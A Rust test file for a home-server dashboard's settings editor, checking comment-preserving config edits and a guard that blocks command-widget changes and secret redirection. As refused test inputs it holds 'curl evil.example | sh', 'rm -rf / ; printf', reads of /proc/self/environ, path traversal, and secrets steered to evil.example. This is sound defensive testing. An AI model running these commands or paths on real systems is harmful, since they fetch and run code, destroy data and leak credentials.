//! Settings tests (DESIGN.md section 8). The fixture is a copy of the real
//! deployed config (comments, a command widget, two alert rules).

use bytes::Bytes;
use http_body_util::{BodyExt, Full};
use hyper::{HeaderMap, Method, StatusCode};
use serde_json::{json, Value as J};
use std::path::PathBuf;
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::Arc;

use super::store::{self, Current};
use super::{api, diff, doc, guard, ops};
use crate::state::AppState;

const FIXTURE: &str = include_str!("fixtures/config.toml");

// ------------------------------------------------------------ helpers

fn tmp_dir() -> PathBuf {
    static N: AtomicU64 = AtomicU64::new(0);
    let d = std::env::temp_dir().join(format!(
        "rh-settings-{}-{}",
        std::process::id(),
        N.fetch_add(1, Ordering::Relaxed)
    ));
    let _ = std::fs::remove_dir_all(&d);
    std::fs::create_dir_all(&d).unwrap();
    d
}

fn state_with(text: Option<&str>) -> (PathBuf, Arc<AppState>) {
    let dir = tmp_dir();
    if let Some(t) = text {
        std::fs::write(dir.join("config.toml"), t).unwrap();
    }
    let env = crate::state::Env {
        listen: vec![],
        data_dir: dir.clone(),
        config_path: dir.join("config.toml"),
        docker_socket: String::new(),
        host_proc: "/nonexistent-proc".into(),
        host_sys: "/nonexistent-sys".into(),
        hostname: "testhost".into(),
        allowed_hosts: vec![],
    };
    (dir, AppState::new(env))
}

fn cur(text: &str) -> Current {
    Current {
        text: text.to_string(),
        hash: doc::sha256_hex(text.as_bytes()),
        exists: true,
    }
}

fn hash(text: &str) -> String {
    doc::sha256_hex(text.as_bytes())
}

fn file(dir: &std::path::Path) -> String {
    std::fs::read_to_string(dir.join("config.toml")).unwrap_or_default()
}

async fn call(st: &Arc<AppState>, method: Method, path: &str, body: Option<J>) -> (StatusCode, J) {
    let segs = path
        .split('/')
        .filter(|s| !s.is_empty())
        .map(String::from)
        .collect();
    let resp = api::handle(
        st,
        api::Call {
            method,
            segs,
            headers: HeaderMap::new(),
            body: body
                .map(|b| Bytes::from(serde_json::to_vec(&b).unwrap()))
                .unwrap_or_default(),
            user: "admin".into(),
        },
    )
    .await;
    let status = resp.status();
    let bytes = resp.into_body().collect().await.unwrap().to_bytes();
    (status, serde_json::from_slice(&bytes).unwrap_or(J::Null))
}

async fn post(st: &Arc<AppState>, path: &str, body: J) -> (StatusCode, J) {
    call(st, Method::POST, path, Some(body)).await
}

async fn get(st: &Arc<AppState>, path: &str) -> (StatusCode, J) {
    call(st, Method::GET, path, None).await
}

fn comments(text: &str) -> Vec<&str> {
    text.lines()
        .filter(|l| l.trim_start().starts_with('#'))
        .collect()
}

/// (added, removed) line counts between two texts.
fn changes(a: &str, b: &str) -> (usize, usize) {
    let v = diff::hunks_json(a, b);
    (
        v["added"].as_u64().unwrap() as usize,
        v["removed"].as_u64().unwrap() as usize,
    )
}

fn parse_ok(text: &str) -> crate::config::Config {
    crate::config::parse(text, "t.toml").unwrap_or_else(|e| panic!("{e}\n---\n{text}"))
}

fn widget_ids(text: &str) -> Vec<String> {
    parse_ok(text)
        .widgets
        .iter()
        .map(|w| w.id.clone())
        .collect()
}

fn list_req(action: &str, id: Option<J>, item: Option<J>, order: Option<J>) -> ops::CollectionReq {
    let mut v = json!({"base_hash": "x", "action": action});
    if let Some(i) = id {
        v["id"] = i;
    }
    if let Some(i) = item {
        v["item"] = i;
    }
    if let Some(o) = order {
        v["order"] = o;
    }
    serde_json::from_value(v).unwrap()
}

fn mailpit2() -> J {
    json!({
        "id": "mailpit2", "type": "custom-api", "title": "Mailpit 2",
        "url": "http://100.64.0.10:8025/api/v1/info", "refresh": "60s",
        "fields": {"unread": "Unread", "messages": "Messages", "size": "DatabaseSize", "version": "Version"},
        "rows": [{"label": "Unread", "value": "{{unread | number}}"}, {"label": "DB", "value": "{{size | bytes}}"}],
        "status": {"field": "_status", "ok": [200]},
    })
}

// ------------------------------------------------------------ engine

#[test]
fn fixture_round_trips_and_is_valid() {
    let d = doc::parse(FIXTURE).unwrap();
    assert_eq!(d.to_string(), FIXTURE);
    parse_ok(FIXTURE);
}

#[test]
fn hash_is_sha256_hex() {
    assert_eq!(
        hash(""),
        "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
    );
}

#[test]
fn general_edit_changes_one_line_and_keeps_comments() {
    let req: ops::PatchReq =
        serde_json::from_value(json!({"base_hash": "x", "page": {"title": "home"}})).unwrap();
    let d = ops::general(&cur(FIXTURE), &req).unwrap();
    assert_eq!(changes(FIXTURE, &d.text), (1, 1), "{}", d.text);
    assert!(d.text.contains("title = \"home\""));
    assert_eq!(comments(FIXTURE), comments(&d.text));
    assert_eq!(d.note, "general");
    assert_eq!(parse_ok(&d.text).page.title.as_deref(), Some("home"));

    // Adding a key adds one line; null removes it again.
    let req: ops::PatchReq =
        serde_json::from_value(json!({"base_hash": "x", "page": {"columns": 3, "layout": "list"}}))
            .unwrap();
    let d2 = ops::general(&cur(&d.text), &req).unwrap();
    assert_eq!(changes(&d.text, &d2.text), (2, 0));
    let req: ops::PatchReq = serde_json::from_value(
        json!({"base_hash": "x", "page": {"columns": null, "layout": null}}),
    )
    .unwrap();
    let d3 = ops::general(&cur(&d2.text), &req).unwrap();
    assert_eq!(d3.text, d.text);
}

#[test]
fn unchanged_value_keeps_its_formatting_and_trailing_comment() {
    let text = "[page]\ntitle = 'homelab'   # my box\ncolumns = 4 # four\n";
    let req: ops::PatchReq = serde_json::from_value(
        json!({"base_hash": "x", "page": {"title": "homelab", "columns": 5}}),
    )
    .unwrap();
    let d = ops::general(&cur(text), &req).unwrap();
    assert_eq!(
        d.text,
        "[page]\ntitle = 'homelab'   # my box\ncolumns = 5 # four\n"
    );
}

#[test]
fn shapes_reject_unknown_fields_and_bad_types() {
    let req: ops::PatchReq =
        serde_json::from_value(json!({"base_hash": "x", "page": {"titel": "x"}})).unwrap();
    let e = ops::general(&cur(FIXTURE), &req).unwrap_err();
    assert_eq!(e.status, StatusCode::BAD_REQUEST);
    let req: ops::PatchReq =
        serde_json::from_value(json!({"base_hash": "x", "page": {"theme": "pink"}})).unwrap();
    assert_eq!(
        ops::general(&cur(FIXTURE), &req).unwrap_err().status,
        StatusCode::BAD_REQUEST
    );
    assert!(
        serde_json::from_value::<ops::PatchReq>(json!({"base_hash": "x", "page": {}, "x": 1}))
            .is_err()
    );
}

#[test]
fn widget_add_writes_tables_after_the_last_widget() {
    let req = list_req("add", None, Some(mailpit2()), None);
    let d = ops::list_action(&cur(FIXTURE), &ops::WIDGETS, &req).unwrap();
    let (added, removed) = changes(FIXTURE, &d.text);
    assert_eq!(removed, 0, "{}", d.text);
    assert!(added > 5);
    assert_eq!(comments(FIXTURE), comments(&d.text));
    assert_eq!(
        widget_ids(&d.text),
        [
            "beszel",
            "mailpit",
            "odoo20",
            "procs",
            "broken-demo",
            "mailpit2"
        ]
    );
    // Placed before the notifications section, as sub-tables.
    let w = d.text.find("id = \"mailpit2\"").unwrap();
    assert!(w < d.text.find("# ---- Notifications").unwrap());
    assert!(w > d.text.find("id = \"broken-demo\"").unwrap());
    assert!(d.text[w..].contains("[widgets.fields]"));
    assert!(d.text[w..].contains("[[widgets.rows]]"));
    assert_eq!(d.note, "widgets: added mailpit2");
    // Adding an existing id is refused.
    let req = list_req(
        "add",
        None,
        Some(json!({"id": "beszel", "type": "custom-api", "url": "http://x/"})),
        None,
    );
    let e = ops::list_action(&cur(FIXTURE), &ops::WIDGETS, &req).unwrap_err();
    assert_eq!(e.status, StatusCode::UNPROCESSABLE_ENTITY);
}

#[test]
fn widget_edit_patches_in_place() {
    // What GET /widgets returns for it, edited like the form would.
    let d0 = doc::parse(FIXTURE).unwrap();
    let t = d0["widgets"].as_array_of_tables().unwrap().get(4).unwrap();
    let mut item = doc::table_json(t);
    item["title"] = json!("Broken (still)");
    item["fields"]["y"] = json!("y");
    let req = list_req("edit", Some(json!("broken-demo")), Some(item), None);
    let d = ops::list_action(&cur(FIXTURE), &ops::WIDGETS, &req).unwrap();
    assert_eq!(changes(FIXTURE, &d.text), (2, 1), "{}", d.text);
    assert!(d
        .text
        .contains("# Deliberately broken (nothing listens on :9) to show one failing widget"));
    assert_eq!(d.note, "widgets: edited broken-demo");
    parse_ok(&d.text);
}

#[test]
fn widget_reorder_moves_entries_with_their_comments() {
    let order = json!(["broken-demo", "beszel", "mailpit", "odoo20", "procs"]);
    let req = list_req("reorder", None, None, Some(order));
    let d = ops::list_action(&cur(FIXTURE), &ops::WIDGETS, &req).unwrap();
    assert_eq!(
        widget_ids(&d.text),
        ["broken-demo", "beszel", "mailpit", "odoo20", "procs"]
    );
    let mut a: Vec<&str> = FIXTURE.lines().filter(|l| !l.trim().is_empty()).collect();
    let mut b: Vec<&str> = d.text.lines().filter(|l| !l.trim().is_empty()).collect();
    a.sort();
    b.sort();
    assert_eq!(a, b, "reorder must not lose or add lines:\n{}", d.text);
    // Entry comment stays with its entry; nothing else moved.
    let c = d.text.find("# Deliberately broken").unwrap();
    assert!(c < d.text.find("id = \"broken-demo\"").unwrap());
    assert!(d.text.find("id = \"procs\"").unwrap() < d.text.find("# ---- Notifications").unwrap());
    assert!(d.text.find("[icons]").unwrap() < d.text.find("[[widgets]]").unwrap());
    assert_eq!(d.note, "widgets: reordered");
    // Not a permutation.
    let bad = list_req("reorder", None, None, Some(json!(["beszel"])));
    assert!(ops::list_action(&cur(FIXTURE), &ops::WIDGETS, &bad).is_err());
}

#[test]
fn deleting_the_first_widget_keeps_the_section_comment() {
    let req = list_req("delete", Some(json!("beszel")), None, None);
    let d = ops::list_action(&cur(FIXTURE), &ops::WIDGETS, &req).unwrap();
    assert_eq!(
        widget_ids(&d.text),
        ["mailpit", "odoo20", "procs", "broken-demo"]
    );
    let h = d.text.find("# ---- Custom widgets (M3)").unwrap();
    assert!(h < d.text.find("id = \"mailpit\"").unwrap());
    assert_eq!(comments(FIXTURE), comments(&d.text));
    assert_eq!(d.note, "widgets: deleted beszel");
}

#[test]
fn bookmarks_add_edit_reorder_delete() {
    let add = |text: &str, name: &str| {
        let req = list_req(
            "add",
            None,
            Some(json!({"name": name, "url": format!("https://{name}.example"), "group": "Links"})),
            None,
        );
        ops::list_action(&cur(text), &ops::BOOKMARKS, &req)
            .unwrap()
            .text
    };
    let t1 = add(FIXTURE, "github");
    let t2 = add(&t1, "gitea");
    assert_eq!(changes(FIXTURE, &t2).1, 0);
    let c = parse_ok(&t2);
    assert_eq!(c.bookmarks.len(), 2);
    let req = list_req("reorder", None, None, Some(json!([1, 0])));
    let d = ops::list_action(&cur(&t2), &ops::BOOKMARKS, &req).unwrap();
    assert_eq!(parse_ok(&d.text).bookmarks[0].name, "gitea");
    assert_eq!(d.note, "bookmarks: reordered");
    let req = list_req(
        "edit",
        Some(json!(0)),
        Some(json!({"name": "Gitea", "url": "https://git.example"})),
        None,
    );
    let d = ops::list_action(&cur(&d.text), &ops::BOOKMARKS, &req).unwrap();
    let c = parse_ok(&d.text);
    assert_eq!(c.bookmarks[0].name, "Gitea");
    assert_eq!(c.bookmarks[0].group, None, "missing field is removed");
    assert_eq!(d.note, "bookmarks: renamed gitea to Gitea");
    let mut t = d.text;
    for _ in 0..2 {
        let req = list_req("delete", Some(json!(0)), None, None);
        t = ops::list_action(&cur(&t), &ops::BOOKMARKS, &req)
            .unwrap()
            .text;
    }
    assert_eq!(t, FIXTURE, "adding and deleting restores the file");
    // Missing url: shape error.
    let req = list_req("add", None, Some(json!({"name": "x"})), None);
    assert_eq!(
        ops::list_action(&cur(FIXTURE), &ops::BOOKMARKS, &req)
            .unwrap_err()
            .status,
        StatusCode::BAD_REQUEST
    );
}

#[test]
fn groups_replace_and_reorder() {
    let req: ops::GroupsReq = serde_json::from_value(json!({"base_hash": "x", "groups": [
        {"name": "beszel", "title": "Monitoring", "collapsed": true},
        {"name": "dev", "columns": 3},
    ]}))
    .unwrap();
    let d = ops::groups(&cur(FIXTURE), &req).unwrap();
    assert_eq!(changes(FIXTURE, &d.text).1, 0);
    let c = parse_ok(&d.text);
    assert_eq!(c.groups.len(), 2);
    assert_eq!(c.groups[0].title.as_deref(), Some("Monitoring"));
    assert_eq!(d.note, "groups: added beszel, dev");
    let req: ops::GroupsReq = serde_json::from_value(json!({"base_hash": "x", "groups": [
        {"name": "dev", "columns": 3},
        {"name": "beszel", "title": "Monitoring", "collapsed": true},
    ]}))
    .unwrap();
    let d2 = ops::groups(&cur(&d.text), &req).unwrap();
    assert_eq!(parse_ok(&d2.text).groups[0].name, "dev");
    assert_eq!(d2.note, "groups: reordered");
    let req: ops::GroupsReq =
        serde_json::from_value(json!({"base_hash": "x", "groups": []})).unwrap();
    assert_eq!(ops::groups(&cur(&d2.text), &req).unwrap().text, FIXTURE);
    let dup: ops::GroupsReq =
        serde_json::from_value(json!({"base_hash": "x", "groups": [{"name": "a"}, {"name": "a"}]}))
            .unwrap();
    assert!(ops::groups(&cur(FIXTURE), &dup).is_err());
}

#[test]
fn container_overrides_quote_names_and_bulk_edit() {
    let req: ops::OverrideReq = serde_json::from_value(json!({
        "base_hash": "x", "names": ["web.1", "my-app_2", "dozzle"],
        "set": {"group": "apps", "icon": "docker"},
    }))
    .unwrap();
    let d = ops::container_override(&cur(FIXTURE), &req).unwrap();
    assert!(d.text.contains("[containers.\"web.1\"]"), "{}", d.text);
    assert!(d.text.contains("[containers.my-app_2]"));
    assert!(!d.text.contains("[containers]\n"), "no empty parent header");
    assert_eq!(changes(FIXTURE, &d.text).1, 0);
    let c = parse_ok(&d.text);
    assert_eq!(c.containers["web.1"].group.as_deref(), Some("apps"));
    assert_eq!(c.containers["dozzle"].icon.as_deref(), Some("docker"));
    assert_eq!(d.note, "containers: 3 overrides");

    let req: ops::OverrideReq = serde_json::from_value(json!({
        "base_hash": "x", "names": ["web.1"], "set": {"hide": true}, "clear": ["icon"],
    }))
    .unwrap();
    let d2 = ops::container_override(&cur(&d.text), &req).unwrap();
    let c = parse_ok(&d2.text);
    assert_eq!(c.containers["web.1"].hide, Some(true));
    assert_eq!(c.containers["web.1"].icon, None);
    assert_eq!(d2.note, "containers: web.1");

    // Clearing every key removes the table; removing all restores the file.
    let req: ops::OverrideReq = serde_json::from_value(json!({
        "base_hash": "x", "names": ["web.1", "my-app_2", "dozzle"], "remove": true,
    }))
    .unwrap();
    assert_eq!(
        ops::container_override(&cur(&d2.text), &req).unwrap().text,
        FIXTURE
    );

    for bad in ["", "a b", "../x", "-x", "x\"]"] {
        let req: ops::OverrideReq = serde_json::from_value(
            json!({"base_hash": "x", "names": [bad], "set": {"hide": true}}),
        )
        .unwrap();
        assert!(
            ops::container_override(&cur(FIXTURE), &req).is_err(),
            "{bad:?}"
        );
    }
    let req: ops::OverrideReq =
        serde_json::from_value(json!({"base_hash": "x", "names": ["a"], "set": {"size": "huge"}}))
            .unwrap();
    assert!(ops::container_override(&cur(FIXTURE), &req).is_err());
}

#[test]
fn docker_exclude_and_system_toggle() {
    let req: ops::ExcludeReq =
        serde_json::from_value(json!({"base_hash": "x", "exclude": ["*-e2e-*", "buildx_*"]}))
            .unwrap();
    let d = ops::docker_exclude(&cur(FIXTURE), &req).unwrap();
    assert_eq!(parse_ok(&d.text).docker.exclude, ["*-e2e-*", "buildx_*"]);
    let req: ops::ExcludeReq =
        serde_json::from_value(json!({"base_hash": "x", "exclude": []})).unwrap();
    assert_eq!(
        ops::docker_exclude(&cur(&d.text), &req).unwrap().text,
        FIXTURE
    );

    let req: ops::SystemReq =
        serde_json::from_value(json!({"base_hash": "x", "enabled": false})).unwrap();
    let d = ops::system(&cur(FIXTURE), &req).unwrap();
    assert!(!parse_ok(&d.text).system.enabled);
    assert_eq!(d.note, "widgets: system tiles off");
}

#[test]
fn history_section_is_patched_generically() {
    let req: ops::PatchReq =
        serde_json::from_value(json!({"base_hash": "x", "history": {"sample_interval": "30s"}}))
            .unwrap();
    let d = ops::history(&cur(FIXTURE), &req).unwrap();
    assert!(
        d.text.ends_with("[history]\nsample_interval = \"30s\"\n"),
        "{}",
        d.text
    );
    let req: ops::PatchReq =
        serde_json::from_value(json!({"base_hash": "x", "history": {"Bad-Key": 1}})).unwrap();
    assert!(ops::history(&cur(FIXTURE), &req).is_err());
    let req: ops::PatchReq =
        serde_json::from_value(json!({"base_hash": "x", "history": {"x": [1]}})).unwrap();
    assert!(ops::history(&cur(FIXTURE), &req).is_err());
}

#[test]
fn channels_take_env_names_never_values() {
    let add = |text: &str, item: J| {
        let req = list_req("add", None, Some(item), None);
        ops::channel_action(&cur(text), &req)
    };
    let d = add(
        FIXTURE,
        json!({"name": "slack", "type": "slack", "webhook_url_env": "RH_SLACK_WEBHOOK_URL"}),
    )
    .unwrap();
    assert!(d.text.contains("[channels.slack]"));
    assert!(d.warnings.is_empty());
    assert_eq!(d.note, "notifications: added channel slack");
    let c = parse_ok(&d.text);
    assert_eq!(
        c.channels["slack"].webhook_url_env.as_deref(),
        Some("RH_SLACK_WEBHOOK_URL")
    );
    // The commented examples above [[alerts]] are untouched.
    assert_eq!(comments(FIXTURE), comments(&d.text));

    // A secret value in an *_env field is refused.
    let e = add(
        FIXTURE,
        json!({"name": "s2", "type": "slack", "webhook_url_env": "https://hooks.slack.com/services/T0/B0/abc"}),
    )
    .unwrap_err();
    assert_eq!(e.status, StatusCode::UNPROCESSABLE_ENTITY);
    assert_eq!(e.body["field"], "webhook_url_env");
    assert!(!e.body.to_string().contains("hooks.slack.com"));
    let e = add(
        FIXTURE,
        json!({"name": "t", "type": "telegram", "token_env": "lower_case", "chat_id": 1}),
    )
    .unwrap_err();
    assert_eq!(e.body["field"], "token_env");
    // A file path outside {data_dir}/secrets passes the form's format check
    // but is refused by the guard that every commit runs.
    let dp = add(
        FIXTURE,
        json!({"name": "t", "type": "telegram", "token_file": "/proc/self/environ", "chat_id": 1}),
    )
    .unwrap();
    assert!(guard::check(FIXTURE, &dp.text, sec()).is_err());
    let e = add(
        FIXTURE,
        json!({"name": "t", "type": "telegram", "token_file": "../etc/x", "chat_id": 1}),
    )
    .unwrap_err();
    assert_eq!(e.body["field"], "token_file");
    // Unknown field (a secret by another name) is refused.
    assert!(add(
        FIXTURE,
        json!({"name": "t", "type": "telegram", "token": "123:abc"})
    )
    .is_err());

    // Plain webhook url: allowed, with a warning.
    let d2 = add(
        &d.text,
        json!({"name": "hook", "type": "webhook", "url": "http://100.64.0.10:8080/hook"}),
    )
    .unwrap();
    assert_eq!(d2.warnings.len(), 1);

    // Rename keeps rules pointing at it.
    let with_rule = d.text.replace(
        "channels = []                    # e.g.",
        "channels = [\"slack\"]                    # e.g.",
    );
    parse_ok(&with_rule);
    let req = list_req(
        "edit",
        Some(json!("slack")),
        Some(json!({"name": "team", "type": "slack", "webhook_url_env": "RH_SLACK_WEBHOOK_URL"})),
        None,
    );
    let d3 = ops::channel_action(&cur(&with_rule), &req).unwrap();
    let c = parse_ok(&d3.text);
    assert!(c.channels.contains_key("team"));
    assert_eq!(c.alerts[0].channels, ["team"]);
    assert!(d3
        .text
        .contains("channels = [\"team\"]                    # e.g."));
    assert_eq!(d3.note, "notifications: renamed channel slack to team");

    // Delete the last channel: back to the original file.
    let req = list_req("delete", Some(json!("slack")), None, None);
    assert_eq!(
        ops::channel_action(&cur(&d.text), &req).unwrap().text,
        FIXTURE
    );
}

#[test]
fn alert_rules_add_edit_delete() {
    let rule = json!({
        "name": "odoo-up", "type": "http", "url": "http://100.64.0.10:8070/web/health",
        "interval": "60s", "timeout": "5s", "expect_status": 200, "failures": 2,
        "channels": [], "cooldown": "15m", "for": "1m",
    });
    let req = list_req("add", None, Some(rule.clone()), None);
    let d = ops::list_action(&cur(FIXTURE), &ops::ALERTS, &req).unwrap();
    let c = parse_ok(&d.text);
    assert_eq!(c.alerts.len(), 3);
    assert_eq!(c.alerts[2].failures, Some(2));
    assert_eq!(d.note, "alerts: added odoo-up");
    let mut edited = rule.clone();
    edited["failures"] = json!(3);
    let req = list_req("edit", Some(json!("odoo-up")), Some(edited), None);
    let d2 = ops::list_action(&cur(&d.text), &ops::ALERTS, &req).unwrap();
    assert_eq!(changes(&d.text, &d2.text), (1, 1));
    let req = list_req("delete", Some(json!("odoo-up")), None, None);
    assert_eq!(
        ops::list_action(&cur(&d2.text), &ops::ALERTS, &req)
            .unwrap()
            .text,
        FIXTURE
    );
    let mut bad = rule;
    bad["severity"] = json!("high");
    let req = list_req("add", None, Some(bad), None);
    assert!(ops::list_action(&cur(FIXTURE), &ops::ALERTS, &req).is_err());
}

// ------------------------------------------------------------ guard

const CMD: &str = r#"
[[widgets]]
id = "procs"
type = "command"
enabled = true
command = ["sh", "-c", "echo 1"]
"#;

fn guard_err(old: &str, new: &str) -> String {
    guard::check(old, new, sec()).unwrap_err().0
}

#[test]
fn guard_matrix() {
    // Raw add.
    assert!(guard_err("", CMD).contains("adds"));
    // Modify any key.
    for (a, b) in [
        ("echo 1", "echo 2"),
        ("enabled = true", "enabled = true\ntimeout = \"9s\""),
        ("id = \"procs\"", "id = \"procs\"\ntitle = \"x\""),
        ("enabled = true", "enabled = true\nenv = { A = \"b\" }"),
    ] {
        assert!(
            guard_err(CMD, &CMD.replace(a, b)).contains("changes"),
            "{b}"
        );
    }
    // Enable.
    let off = CMD.replace("enabled = true", "enabled = false");
    assert!(guard_err(&off, CMD).contains("enables"));
    let unset = CMD.replace("enabled = true\n", "");
    assert!(guard_err(&unset, CMD).contains("enables"));
    // Rename the id: a new command widget.
    assert!(guard_err(CMD, &CMD.replace("\"procs\"", "\"procs2\"")).contains("adds"));
    // custom-api -> command.
    let api = "[[widgets]]\nid = \"procs\"\ntype = \"custom-api\"\nurl = \"http://x/\"\n";
    assert!(guard_err(api, CMD).contains("turns into"));
    // A custom-api widget that gains a command key, or an unknown type.
    let gains = api.replace("url =", "command = [\"sh\"]\nurl =");
    assert!(guard::check(api, &gains, sec()).is_err());
    assert!(guard::check(api, &api.replace("custom-api", "Command"), sec()).is_err());
    // Inline-array form is caught too.
    let inline = "widgets = [{ id = \"x\", type = \"command\", command = [\"sh\"] }]\n";
    assert!(guard::check("", inline, sec()).is_err());
    // Restore of an old revision with a different command widget.
    let old_rev = CMD.replace("echo 1", "curl evil.example | sh");
    assert!(guard::check(CMD, &old_rev, sec()).is_err());
    // An unparsable old file counts as having no command widgets.
    assert!(guard::check("[[widgets", CMD, sec()).is_err());

    // Allowed: unchanged through an unrelated edit, reformatted, deleted,
    // turned into a harmless custom-api widget.
    let other = format!("[page]\ntitle = \"x\"\n{CMD}");
    assert!(guard::check(CMD, &other, sec()).is_ok());
    let reformatted = CMD.replace("[\"sh\", \"-c\", \"echo 1\"]", "[ 'sh', '-c', 'echo 1' ]");
    assert!(guard::check(CMD, &reformatted, sec()).is_ok());
    assert!(guard::check(CMD, "", sec()).is_ok());
    assert!(guard::check(CMD, api, sec()).is_ok());
    assert!(guard::check(FIXTURE, FIXTURE, sec()).is_ok());
}

fn sec() -> &'static std::path::Path {
    std::path::Path::new("/data/secrets")
}

#[test]
fn guard_secret_files_are_allowlisted_to_data_secrets() {
    let w = |p: &str| {
        format!("[[widgets]]\nid = \"a\"\ntype = \"custom-api\"\nurl = \"http://x/\"\nheaders_file = {{ X = \"{p}\" }}\n")
    };
    // Denylist bypasses from the security review, and other places.
    for bad in [
        "/proc/1/environ",
        "/host/proc/self/environ",
        "/host/proc/1/environ",
        "/host/sys/kernel/x",
        "/data/hobnail.db",
        "/data/secrets/../hobnail.db",
        "/data/secretsX/t",
        "/run/secrets/tg",
        "relative/path",
    ] {
        assert!(
            guard::check("", &w(bad), sec()).is_err(),
            "{bad} must be refused"
        );
    }
    // Already in the file (set on the host): left alone.
    assert!(guard::check(&w("/run/secrets/tg"), &w("/run/secrets/tg"), sec()).is_ok());
    // The secrets dir is fine (binding check aside: use a channel, unbound).
    let c = "[channels.t]\ntype = \"telegram\"\ntoken_file = \"/data/secrets/tg\"\nchat_id = 1\n";
    assert!(guard::check("", c, sec()).is_ok());
    assert!(guard::check("", &c.replace("/data/secrets/tg", "/run/secrets/tg"), sec()).is_err());
}

#[test]
fn guard_secret_location_resolves_symlinks() {
    let dir = std::env::temp_dir().join(format!("rh-sec-{}", std::process::id()));
    let sec = dir.join("secrets");
    std::fs::create_dir_all(&sec).unwrap();
    std::fs::write(dir.join("outside"), "x").unwrap();
    let link = sec.join("link");
    let _ = std::fs::remove_file(&link);
    std::os::unix::fs::symlink(dir.join("outside"), &link).unwrap();
    let p = link.to_string_lossy().to_string();
    assert!(
        guard::check_secret_location(&p, &sec).is_err(),
        "symlink out of the dir"
    );
    std::fs::write(sec.join("real"), "x").unwrap();
    assert!(guard::check_secret_location(&sec.join("real").to_string_lossy(), &sec).is_ok());
    let _ = std::fs::remove_dir_all(&dir);
}

#[test]
fn guard_binds_secrets_to_their_destination() {
    let w = |url: &str, env: &str| {
        format!("[[widgets]]\nid = \"a\"\ntype = \"custom-api\"\ntitle = \"T\"\nurl = \"{url}\"\nheaders_env = {{ Authorization = \"{env}\" }}\n")
    };
    let base = w("http://svc/api", "SVC_TOKEN");
    // Adding a header secret from the app: refused.
    assert!(guard::check("", &base, sec()).is_err());
    // Steering an existing secret to another host: refused.
    assert!(guard::check(&base, &w("http://evil.example/", "SVC_TOKEN"), sec()).is_err());
    // Attaching a different (more valuable) secret to the same URL: refused.
    assert!(guard::check(&base, &w("http://svc/api", "RH_TELEGRAM_TOKEN"), sec()).is_err());
    // Unrelated edits to the bound widget: allowed.
    assert!(guard::check(
        &base,
        &base.replace("title = \"T\"", "title = \"New\""),
        sec()
    )
    .is_ok());
    // Dropping the secret: allowed.
    let plain = "[[widgets]]\nid = \"a\"\ntype = \"custom-api\"\nurl = \"http://evil.example/\"\n";
    assert!(guard::check(&base, plain, sec()).is_ok());

    // Telegram: default api_base is fixed (allowed); a custom api_base is bound.
    let tg = "[channels.tg]\ntype = \"telegram\"\ntoken_env = \"RH_TELEGRAM_TOKEN\"\nchat_id = 1\n";
    assert!(guard::check("", tg, sec()).is_ok());
    let tg_evil = tg.replace(
        "chat_id = 1",
        "chat_id = 1\napi_base = \"http://evil.example\"",
    );
    assert!(guard::check(tg, &tg_evil, sec()).is_err());
    assert!(
        guard::check(&tg_evil, &tg_evil, sec()).is_ok(),
        "set on the host: kept"
    );
    let tg_moved = tg_evil.replace("evil.example", "other.example");
    assert!(guard::check(&tg_evil, &tg_moved, sec()).is_err());

    // Webhook with a secret header: bound; without one: free.
    let wh = "[channels.w]\ntype = \"webhook\"\nurl = \"http://hook/\"\nheaders_env = { Authorization = \"HOOK_AUTH\" }\n";
    assert!(guard::check("", wh, sec()).is_err());
    assert!(guard::check(wh, &wh.replace("http://hook/", "http://evil/"), sec()).is_err());
    assert!(guard::check(
        "",
        "[channels.w]\ntype = \"webhook\"\nurl = \"http://hook/\"\n",
        sec()
    )
    .is_ok());
    // Slack: the secret is the destination, nothing to steer.
    let sl = "[channels.s]\ntype = \"slack\"\nwebhook_url_env = \"RH_SLACK_WEBHOOK_URL\"\n";
    assert!(guard::check("", sl, sec()).is_ok());
}

#[tokio::test]
async fn form_api_never_touches_command_widgets() {
    let (dir, st) = state_with(Some(FIXTURE));
    let h = hash(FIXTURE);
    let cases = [
        json!({"base_hash": h, "action": "add", "item": {"id": "x", "type": "command", "command": ["sh"]}}),
        json!({"base_hash": h, "action": "add", "item": {"id": "x", "type": "command"}}),
        json!({"base_hash": h, "action": "add", "item": {"id": "x", "type": "custom-api", "url": "http://x/", "env": {}}}),
        json!({"base_hash": h, "action": "add", "item": {"id": "procs", "type": "custom-api", "url": "http://x/"}}),
        json!({"base_hash": h, "action": "edit", "id": "procs", "item": {"id": "procs", "type": "custom-api", "url": "http://x/"}}),
        json!({"base_hash": h, "action": "edit", "id": "beszel", "item": {"id": "procs", "type": "custom-api", "url": "http://x/"}}),
        json!({"base_hash": h, "action": "delete", "id": "procs"}),
    ];
    for c in cases {
        let (s, b) = post(&st, "widgets", c.clone()).await;
        assert_eq!(s, StatusCode::FORBIDDEN, "{c} -> {b}");
        assert_eq!(b["locked"], true);
        assert_eq!(file(&dir), FIXTURE);
    }
    let (s, _) = post(
        &st,
        "widgets/preview",
        json!({"item": {"id": "x", "type": "command", "command": ["id"]}}),
    )
    .await;
    assert_eq!(s, StatusCode::FORBIDDEN);
    // Reordering around the locked widget is fine (it stays identical).
    let (s, b) = post(
        &st,
        "widgets",
        json!({"base_hash": h, "action": "reorder",
        "order": ["procs", "beszel", "mailpit", "odoo20", "broken-demo"]}),
    )
    .await;
    assert_eq!(s, StatusCode::OK, "{b}");
    assert_eq!(widget_ids(&file(&dir))[0], "procs");
}

#[tokio::test]
async fn raw_editor_guard_and_allowed_cases() {
    let (dir, st) = state_with(Some(FIXTURE));
    let h = hash(FIXTURE);
    let refused = [
        FIXTURE.replace("refresh = \"15s\"", "refresh = \"20s\""),
        FIXTURE.replace("id = \"procs\"", "id = \"procs2\""),
        FIXTURE.replace("printf", "rm -rf / ; printf"),
        format!("{FIXTURE}\n[[widgets]]\nid = \"x\"\ntype = \"command\"\nenabled = true\ncommand = [\"id\"]\n"),
        FIXTURE.replace("id = \"beszel\"\ntype = \"custom-api\"", "id = \"beszel\"\ntype = \"command\"\ncommand = [\"id\"]"),
    ];
    for t in &refused {
        let (s, b) = post(&st, "config", json!({"base_hash": h, "text": t})).await;
        assert!(
            s == StatusCode::FORBIDDEN || s == StatusCode::UNPROCESSABLE_ENTITY,
            "{s} {b}"
        );
        assert_eq!(file(&dir), FIXTURE, "refused text must never be written");
    }
    // Enabling a disabled command widget.
    let off = FIXTURE.replace("enabled = true", "enabled = false");
    let (dir2, st2) = state_with(Some(&off));
    let (s, b) = post(
        &st2,
        "config",
        json!({"base_hash": hash(&off), "text": FIXTURE}),
    )
    .await;
